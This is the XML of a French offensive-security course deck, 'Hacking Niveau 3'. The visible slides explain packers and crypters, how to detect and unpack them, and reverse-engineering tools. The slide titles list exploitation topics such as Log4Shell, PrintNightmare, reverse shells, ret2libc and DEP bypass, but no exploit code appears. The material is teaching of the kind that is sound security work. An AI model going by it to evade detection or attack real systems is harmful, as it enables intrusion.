            <a:endParaRPr lang="fr-FR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22EC42-CE53-9BF5-983A-3E43A079CB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562799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498230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1ED3F-1BA0-2A05-5B72-692DDCFA1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Packers et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>crypters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Définition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8D78C-EBA8-6116-0AD2-3DC3B9A42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Packers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Comprimer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masquer un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réduire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taille </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> opaque.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Crypters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Encoder un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>illisible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>éviter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>détection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Objectif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Difficulter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contourner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>détection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103213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C9A3-97A3-8F28-11C4-86F40846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Exemples</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de packers et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>crypters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A62BE-CE27-00CE-B3C1-534EB0AA2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Packers courants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UPX, MPRESS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ASPack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Crypters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>modernes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Themida</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>VMProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Denuvo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Particularités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Certains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ajoutent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machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>virtuelle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>interpréter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="925830" lvl="2" indent="-285750"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Particulierement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>difficiles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à analyser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46395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246DD-5570-903A-6AC7-399FDCC87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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des packers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53132-1ABC-3F76-CD80-3B2A4DA4B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/>
              <a:t>Identifier le packer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>utilisé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Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : Detect-It-Easy, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>PEiD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Dépacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>automatiquement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UPX : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Commande</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>upx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> -d &lt;file&gt;.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Déboguer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> le code à la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>volée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>.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 err="1"/>
              <a:t>Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des routines de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>décryptage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mémoire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248967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72E44-62A2-032F-4551-68FF2D54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Contournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des protections </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modernes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E6B9F-3327-4A3B-F31F-ABCBEC06A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Obfuscation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>avancée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>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Machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>virtuelle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (ex. : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Themida</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>VMProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Techniques de reverse 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Dump </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> après </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>déchiffrement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Analyse du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamique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Utilisation de scripts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatisés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (ex. : Scylla, x64dbg).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459800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F448D61-FD92-4997-B065-20433412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67C92F-654F-446B-8347-9FF2DAF66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555A4C0-F746-4932-ABD3-024F4B231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62000"/>
            <a:ext cx="10668000" cy="533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DA443-DB6F-BEC8-AFB0-4CC58E189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1746913"/>
            <a:ext cx="7619999" cy="18833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/>
              <a:t>Merci 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51A8F8-7445-4C49-926D-816D68765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870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ortalVTI">
  <a:themeElements>
    <a:clrScheme name="AnalogousFromDarkSeedLeftStep">
      <a:dk1>
        <a:srgbClr val="000000"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="1C2431"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="F0F3F0"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="E329E7"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="8217D5"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="472CE7"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="174BD5"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="29ACE7"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="15C1AF"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="3F82BF"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="7F7F7F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11560</TotalTime>
  <Words>6490</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>1044</Paragraphs>
  <Slides>151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151</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="156" baseType="lpstr">
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Trade Gothic Next Cond</vt:lpstr>
      <vt:lpstr>Trade Gothic Next Light</vt:lpstr>
      <vt:lpstr>PortalVTI</vt:lpstr>
      <vt:lpstr>Hacking Niveau 3</vt:lpstr>
      <vt:lpstr>Objectifs</vt:lpstr>
      <vt:lpstr>Cybersécurité et technologies émergentes</vt:lpstr>
      <vt:lpstr>La 5G : Les principaux types d'attaques</vt:lpstr>
      <vt:lpstr>Cybersécurité et technologies émergentes</vt:lpstr>
      <vt:lpstr>Blockchain : Défenses en place</vt:lpstr>
      <vt:lpstr>Cybersécurité et technologies émergentes</vt:lpstr>
      <vt:lpstr>IoT : Méthodes de défense avancées</vt:lpstr>
      <vt:lpstr>Cybersécurité et technologies émergentes</vt:lpstr>
      <vt:lpstr>IA : Stratégies pour contrecarrer les abus</vt:lpstr>
      <vt:lpstr>Les “dernières” techniques d’attaques</vt:lpstr>
      <vt:lpstr>Log4Shell : Pourquoi c’était critique ?</vt:lpstr>
      <vt:lpstr>Introduction à Log4Shell</vt:lpstr>
      <vt:lpstr>Origine et découverte</vt:lpstr>
      <vt:lpstr>Qu’est-ce que Log4j ?</vt:lpstr>
      <vt:lpstr>Concept de base de JNDI</vt:lpstr>
      <vt:lpstr>Chaîne d’exécution vulnérable</vt:lpstr>
      <vt:lpstr>Pourquoi est-ce une faille ?</vt:lpstr>
      <vt:lpstr>Log4shell Injection d’une charge utile</vt:lpstr>
      <vt:lpstr>Comportement JNDI</vt:lpstr>
      <vt:lpstr>Impact technique</vt:lpstr>
      <vt:lpstr>Détection de l’exploitation</vt:lpstr>
      <vt:lpstr>Attaques réelles signalées</vt:lpstr>
      <vt:lpstr>Les dernières techniques d’attaques</vt:lpstr>
      <vt:lpstr>PrintNightmare : Pourquoi cela a-t-il duré si longtemps ?</vt:lpstr>
      <vt:lpstr>Qu’est-ce que PrintNightmare ?</vt:lpstr>
      <vt:lpstr>Origine et découverte</vt:lpstr>
      <vt:lpstr>Contexte technique</vt:lpstr>
      <vt:lpstr>Principe de PrintNightmare</vt:lpstr>
      <vt:lpstr>Étapes de l’attaque RCEÉtapes de l’attaque RCE</vt:lpstr>
      <vt:lpstr>Étapes de l’attaque LPE</vt:lpstr>
      <vt:lpstr>Pourquoi est-ce une faille ?</vt:lpstr>
      <vt:lpstr>Exploitation via une DLL malveillante</vt:lpstr>
      <vt:lpstr>Les dernières techniques d’attaques</vt:lpstr>
      <vt:lpstr>Qu’est-ce que ProxyShell ?</vt:lpstr>
      <vt:lpstr>Principe général</vt:lpstr>
      <vt:lpstr>Phase 1 - Authentification incorrecte (CVE-2021-34473)</vt:lpstr>
      <vt:lpstr>Phase 2 - Élévation de privilèges (CVE-2021-34523)</vt:lpstr>
      <vt:lpstr>Phase 3 - Exécution de code arbitraire (CVE-2021-31207)</vt:lpstr>
      <vt:lpstr>Impacts observés</vt:lpstr>
      <vt:lpstr>État actuel</vt:lpstr>
      <vt:lpstr>Les dernières stratégies défensives</vt:lpstr>
      <vt:lpstr>Techniques défensives modernes : Exemple concret</vt:lpstr>
      <vt:lpstr>Pourquoi étudier les vulnérabilités et techniques modernes ?</vt:lpstr>
      <vt:lpstr>Comprendre l’architecture logicielle</vt:lpstr>
      <vt:lpstr>Pourquoi le langage C ?</vt:lpstr>
      <vt:lpstr>Rust : Le langage sécurisé par conception</vt:lpstr>
      <vt:lpstr>Rust : Le langage sécurisé par conception</vt:lpstr>
      <vt:lpstr>Rust : Le langage sécurisé par conception</vt:lpstr>
      <vt:lpstr>Introduction</vt:lpstr>
      <vt:lpstr>Introduction – Interprété</vt:lpstr>
      <vt:lpstr>Introduction – compilé</vt:lpstr>
      <vt:lpstr>Introduction – bundle</vt:lpstr>
      <vt:lpstr>Introduction au langage assembleur</vt:lpstr>
      <vt:lpstr>Fonctionnement d’un processeur</vt:lpstr>
      <vt:lpstr>Les éléments-clés d’un CPU</vt:lpstr>
      <vt:lpstr>Registres</vt:lpstr>
      <vt:lpstr>Bus</vt:lpstr>
      <vt:lpstr>Instructions</vt:lpstr>
      <vt:lpstr>Résumé des fondamentaux du CPU</vt:lpstr>
      <vt:lpstr>Les concepts de l’encodage</vt:lpstr>
      <vt:lpstr>Instructions et opérations en assembleur</vt:lpstr>
      <vt:lpstr>Les registres du processeur</vt:lpstr>
      <vt:lpstr>Différents types d’opérations</vt:lpstr>
      <vt:lpstr>Modes d'adressage : Étude approfondie</vt:lpstr>
      <vt:lpstr>Reverse Engineering IoT</vt:lpstr>
      <vt:lpstr>Objectifs du Reverse Engineering</vt:lpstr>
      <vt:lpstr>Approche Générale</vt:lpstr>
      <vt:lpstr>Extraction Physique</vt:lpstr>
      <vt:lpstr>Extraction Logique</vt:lpstr>
      <vt:lpstr>Exploration avec Binwalk</vt:lpstr>
      <vt:lpstr>Systèmes de Fichiers Embarqués</vt:lpstr>
      <vt:lpstr>Détection des Vulnérabilités</vt:lpstr>
      <vt:lpstr>Comprendre la Communication Interne</vt:lpstr>
      <vt:lpstr>FAT !</vt:lpstr>
      <vt:lpstr>Fonctionnalités Principales</vt:lpstr>
      <vt:lpstr>Architecture de FAT</vt:lpstr>
      <vt:lpstr>Installation de Firmware Analysis Toolkit</vt:lpstr>
      <vt:lpstr>Encore des problèmes</vt:lpstr>
      <vt:lpstr>Toujours des problèmes…</vt:lpstr>
      <vt:lpstr>Netgear</vt:lpstr>
      <vt:lpstr>C'EST QUOI UN SHELLCODE ?</vt:lpstr>
      <vt:lpstr>Qu’est-ce qu’un shellcode ?</vt:lpstr>
      <vt:lpstr>Pourquoi les shellcodes sont importants ?</vt:lpstr>
      <vt:lpstr>Types de shellcodes</vt:lpstr>
      <vt:lpstr>Shellcode Linux vs Windows</vt:lpstr>
      <vt:lpstr>Structure d’un shellcode simple</vt:lpstr>
      <vt:lpstr>Environnement de conception des shellcodes</vt:lpstr>
      <vt:lpstr>Encodage des shellcodes</vt:lpstr>
      <vt:lpstr>Exemple d’encodage simple (XOR)</vt:lpstr>
      <vt:lpstr>Reverse Shell TCP (Linux)</vt:lpstr>
      <vt:lpstr>Reverse Shell TCP (Windows)</vt:lpstr>
      <vt:lpstr>Bind Shell</vt:lpstr>
      <vt:lpstr>Shellcodes polymorphes</vt:lpstr>
      <vt:lpstr>Limitation des NULL bytes</vt:lpstr>
      <vt:lpstr>Sécurité &amp; Shellcode</vt:lpstr>
      <vt:lpstr>Comprendre les buffer overflows sous Linux</vt:lpstr>
      <vt:lpstr>Qu’est-ce qu’un buffer overflow ?</vt:lpstr>
      <vt:lpstr>Pourquoi les buffer overflows sont dangereux ?</vt:lpstr>
      <vt:lpstr>Comprendre la pile (stack)</vt:lpstr>
      <vt:lpstr>Exemple pratique d’un buffer overflow simple</vt:lpstr>
      <vt:lpstr>Comprendre les protections modernes (ASLR)</vt:lpstr>
      <vt:lpstr>Qu’est-ce que NX (Non-Executable Stack)</vt:lpstr>
      <vt:lpstr>Buffer Overflow - Cas de base</vt:lpstr>
      <vt:lpstr>Exploitation sans protection (1/2)</vt:lpstr>
      <vt:lpstr>Exploitation sans protection (2/2)</vt:lpstr>
      <vt:lpstr>Exploitation avec ASLR (1/2)</vt:lpstr>
      <vt:lpstr>Exploitation avec ASLR (2/2)</vt:lpstr>
      <vt:lpstr>Exploitation avec NX (1/2)</vt:lpstr>
      <vt:lpstr>Exploitation avec NX (2/2)</vt:lpstr>
      <vt:lpstr>ret2libc</vt:lpstr>
      <vt:lpstr>Principe de ret2libc</vt:lpstr>
      <vt:lpstr>Ret2libc - Étapes de l'attaque</vt:lpstr>
      <vt:lpstr>Ret2libc - Exemple de charge utile</vt:lpstr>
      <vt:lpstr>Exploitation sur IA-64 (1/3)</vt:lpstr>
      <vt:lpstr>Exploitation sur IA-64</vt:lpstr>
      <vt:lpstr>Introduction aux Buffer Overflows sous Windows</vt:lpstr>
      <vt:lpstr>Exploitation sans protection sous Windows</vt:lpstr>
      <vt:lpstr>Exploitation sans protection - Exemple pratique</vt:lpstr>
      <vt:lpstr>Contournement de la protection SafeSEH</vt:lpstr>
      <vt:lpstr>Contournement SafeSEH</vt:lpstr>
      <vt:lpstr>DEP (Data Execution Prevention)</vt:lpstr>
      <vt:lpstr>Contournement du DEP</vt:lpstr>
      <vt:lpstr>Autres types d’Overflow</vt:lpstr>
      <vt:lpstr>Débordement mémoire dans le tas (Heap Overflow)</vt:lpstr>
      <vt:lpstr>Exploitation des Heap Overflows</vt:lpstr>
      <vt:lpstr>Heap Spray</vt:lpstr>
      <vt:lpstr>Exemple de Heap Spray (JavaScript)</vt:lpstr>
      <vt:lpstr>Use After Free</vt:lpstr>
      <vt:lpstr>Exploitation du Use After Free</vt:lpstr>
      <vt:lpstr>Format String</vt:lpstr>
      <vt:lpstr>Exploitation des vulnérabilités de format string</vt:lpstr>
      <vt:lpstr>Analyse statique - Définition</vt:lpstr>
      <vt:lpstr>Outils d’analyse statique</vt:lpstr>
      <vt:lpstr>Processus d’analyse statique</vt:lpstr>
      <vt:lpstr>Avantages et inconvénients de l’analyse statique</vt:lpstr>
      <vt:lpstr>Outils d’analyse dynamiques</vt:lpstr>
      <vt:lpstr>Outils d’analyse dynamique</vt:lpstr>
      <vt:lpstr>Processus d’analyse dynamique</vt:lpstr>
      <vt:lpstr>Avantages et inconvénients de l’analyse dynamique</vt:lpstr>
      <vt:lpstr>La sécurité dans le bac à sable (sandboxing)</vt:lpstr>
      <vt:lpstr>Outils de sandboxing</vt:lpstr>
      <vt:lpstr>Avantages du sandboxing</vt:lpstr>
      <vt:lpstr>Reverse Engineering - Définition</vt:lpstr>
      <vt:lpstr>Débogage pas à pas</vt:lpstr>
      <vt:lpstr>Techniques de Reverse Engineering</vt:lpstr>
      <vt:lpstr>Packers et crypters - Définition</vt:lpstr>
      <vt:lpstr>Exemples de packers et crypters</vt:lpstr>
      <vt:lpstr>Détection et contournement des packers</vt:lpstr>
      <vt:lpstr>Contournement des protections modernes</vt:lpstr>
      <vt:lpstr>Merci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PAR-582 Form</dc:creator>
  <cp:lastModifiedBy>PAR-582 Form</cp:lastModifiedBy>
  <cp:revision>10</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-11-25T18:44:46Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-12-03T19:24:55Z</dcterms:modified>
</cp:coreProperties>
</file>